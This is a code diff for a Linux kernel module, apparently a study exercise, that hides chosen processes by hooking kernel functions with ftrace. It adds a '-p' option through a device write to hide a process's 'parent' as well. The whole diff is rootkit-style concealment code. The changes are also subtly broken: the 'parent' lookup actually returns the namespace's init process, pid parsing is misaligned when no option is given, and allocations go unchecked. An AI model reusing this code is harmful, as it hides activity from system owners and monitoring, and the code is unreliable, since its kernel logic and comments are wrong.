@@ -63,7 +63,6 @@ static int hook_install(struct ftrace_hook *hook)
     return 0;
 }
 
-#if 1
 void hook_remove(struct ftrace_hook *hook)
 {
     int err = unregister_ftrace_function(&hook->ops);
@@ -73,7 +72,6 @@ void hook_remove(struct ftrace_hook *hook)
     if (err)
         printk("ftrace_set_filter_ip() failed: %d\n", err);
 }
-#endif
 
 typedef struct {
     pid_t id;
@@ -114,9 +112,22 @@ static void init_hook(void)
     hook_install(&hook);
 }
 
-static int hide_process(pid_t pid)
+static int hide_process(pid_t pid, bool hide_parent)
 {
-    pid_node_t *proc = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
+    struct pid *p;
+    pid_node_t *proc;
+    if (hide_parent) {
+        p = find_get_pid(pid);
+        if (p) { /* prevent invalid @pid */
+            proc = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
+
+            /* turns out `child_reaper` is the parent of the target process */
+            proc->id = p->numbers[p->level].ns->child_reaper->pid;
+
+            list_add_tail(&proc->list_node, &hidden_proc);
+        }
+    }
+    proc = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
     proc->id = pid;
     list_add_tail(&proc->list_node, &hidden_proc);
     return SUCCESS;
@@ -171,8 +182,9 @@ static ssize_t device_write(struct file *filep,
 {
     long pid;
     char *message;
+    bool hide_parent = false;
 
-    char add_message[] = "add", del_message[] = "del";
+    char add_message[] = "add", del_message[] = "del", hide_parent_opt[] = "-p";
     if (len < sizeof(add_message) - 1 && len < sizeof(del_message) - 1)
         return -EAGAIN;
 
@@ -180,8 +192,13 @@ static ssize_t device_write(struct file *filep,
     memset(message, 0, len + 1);
     copy_from_user(message, buffer, len);
     if (!memcmp(message, add_message, sizeof(add_message) - 1)) {
-        kstrtol(message + sizeof(add_message), 10, &pid);
-        hide_process(pid);
+        kstrtol(message + sizeof(add_message) + sizeof(hide_parent_opt), 10,
+                &pid);
+        if (!memcmp(message + sizeof(add_message), /* start of the opt */
+                    hide_parent_opt,
+                    sizeof(hide_parent_opt) - 1))
+                hide_parent = true;
+        hide_process(pid, hide_parent);
     } else if (!memcmp(message, del_message, sizeof(del_message) - 1)) {
         kstrtol(message + sizeof(del_message), 10, &pid);
         unhide_process(pid);
